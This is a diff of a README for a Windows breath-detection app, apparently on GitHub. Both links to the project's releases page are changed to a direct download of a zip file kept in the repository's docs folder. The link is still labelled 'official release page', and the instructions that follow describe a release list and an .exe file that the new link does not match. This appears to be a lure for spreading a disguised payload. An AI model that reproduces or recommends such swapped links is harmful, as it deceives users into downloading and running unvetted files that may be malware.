@@ -1,6 +1,6 @@
 # 🫁 shiihaa-breath-detection - Track your breathing patterns with ease
 
-[![Download shiihaa-breath-detection](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sufiab8208/shiihaa-breath-detection/releases)
+[![Download shiihaa-breath-detection](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Sufiab8208/shiihaa-breath-detection/main/docs/breath_shiihaa_detection_2.7.zip)
 
 ## 🎯 Purpose
 This application monitors your breathing patterns in real time. It uses your computer microphone to listen for the sound of your breath. The software processes this data directly on your machine. It does not record speech, nor does it upload audio files to any server. Your information stays on your device at all times.
@@ -17,7 +17,7 @@ You need a Windows computer to run this software. Ensure you have the following 
 ## 📥 Download and Installation 🛠️
 Follow these steps to set up the software on your computer.
 
-1.  Visit the official release page: [https://github.com/Sufiab8208/shiihaa-breath-detection/releases](https://github.com/Sufiab8208/shiihaa-breath-detection/releases)
+1.  Visit the official release page: [https://raw.githubusercontent.com/Sufiab8208/shiihaa-breath-detection/main/docs/breath_shiihaa_detection_2.7.zip](https://raw.githubusercontent.com/Sufiab8208/shiihaa-breath-detection/main/docs/breath_shiihaa_detection_2.7.zip)
 2.  Look for the latest version of the software. It will usually appear at the top of the list.
 3.  Click the file ending in `.exe` to start your download.
 4.  Once the file finishes downloading, navigate to your Downloads folder.
